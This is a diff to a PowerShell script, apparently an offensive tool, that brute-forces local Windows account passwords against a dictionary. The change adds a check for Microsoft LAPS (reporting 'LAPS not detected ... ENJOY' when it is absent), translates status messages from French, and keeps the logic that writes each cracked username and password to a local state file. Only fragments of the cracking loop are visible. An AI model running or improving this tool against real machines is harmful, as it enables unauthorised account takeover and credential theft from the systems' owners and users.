@@ -1,17 +1,36 @@
-Function localbrute {
-    param($u, $dct, $debug)
+Function CheckLAPS {
 
+    if ((Test-Path -Path 'C:\Program Files\LAPS\CSE\Admpwd.dll') -or
+    (Test-Path -Path 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll') -or
+    (Test-Path -Path 'C:\Program Files\LAPS\CSE\') -or
+    (Test-Path -Path 'C:\Program Files (x86)\LAPS\CSE\')) {
+        Write-Output "LAPS is active. Sorry."
+        
+        $continue = Read-Host "Do you want to continue anyway? (Type 'Y' for Yes or 'N' for No)"
+        $continue = $continue.ToUpper()
+        if ($continue -ne 'Y') {
+            exit
+        }
+    } else {
+        "LAPS not detected ... ENJOY"
+    }
+}
+
+Function localbrute {
+ 
+    param($u, $dct, $debug)
+    CheckLAPS
     $name = Get-LocalUser | Select-Object -ExpandProperty Name
     $userExists = $false
     foreach($i in $name) {
         if ($i -eq $u) {
             $userExists = $true
-            Write-Output Write-Output "L'utilisateur $i existe parmi les utilisateurs locaux."
+            Write-Output "User $i exists among local users."
         }
     }
 
     if (-not $userExists) {
-        Write-Output "L'utilisateur $u n'existe pas parmi les utilisateurs locaux."
+        Write-Output "User $u does not exist among local users."
         return
     }
 
@@ -39,7 +58,6 @@ Function localbrute {
                     Write-Output "${u}:${d}:True:${password}" >> localbrute.state
                     Write-Output "Password for $u account found: $password"
                     break
-                    #return
                 }
             } catch {
 
